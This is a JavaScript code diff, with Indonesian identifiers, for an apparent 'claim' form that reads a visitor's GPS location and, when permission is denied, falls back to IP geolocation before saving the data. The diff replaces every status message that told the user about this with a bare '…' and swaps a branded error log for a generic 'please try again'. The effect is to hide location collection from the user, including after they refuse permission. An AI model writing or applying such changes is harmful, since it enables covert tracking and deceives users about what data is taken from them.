@@ -190,7 +190,8 @@ async function ambilLokasiIP() {
                 longitude: typeof data.longitude === "number" ? data.longitude : null
             };
         } catch (error) {
-            console.warn("[Koteshu] Gagal mengambil lokasi IP dari", url, error.message);
+            // console.warn("[Koteshu] Gagal mengambil lokasi IP dari", url, error.message);
+            console.warn("Silahkan coba lagi", url, error.message);
         } finally {
             clearTimeout(batas);
         }
@@ -246,7 +247,8 @@ async function prosesKlaim(event) {
 
     try {
         // --- Langkah 1: lokasi GPS ---
-        tampilkanStatus("info", "Meminta izin lokasi ke browser…", true);
+        // tampilkanStatus("info", "Meminta izin lokasi ke browser…", true);
+        tampilkanStatus("info", "…", true);
         const gps = await ambilGPS();
 
         let metode = "GPS";
@@ -263,10 +265,12 @@ async function prosesKlaim(event) {
             longitude = gps.longitude;
             akurasi = gps.akurasi;
             gpsIp = `${gps.latitude}, ${gps.longitude}`;
-            tampilkanStatus("info", "Lokasi GPS berhasil dibaca. Menyimpan data…", true);
+            // tampilkanStatus("info", "Lokasi GPS berhasil dibaca. Menyimpan data…", true);
+            tampilkanStatus("info", "…", true);
         } else {
             // --- Langkah 2: fallback lokasi perkiraan dari IP ---
-            tampilkanStatus("info", "Izin lokasi tidak diberikan. Mengambil perkiraan lokasi dari IP…", true);
+            // tampilkanStatus("info", "Izin lokasi tidak diberikan. Mengambil perkiraan lokasi dari IP…", true);
+            tampilkanStatus("info", "…", true);
             const dataIp = await ambilLokasiIP();
 
             if (dataIp) {
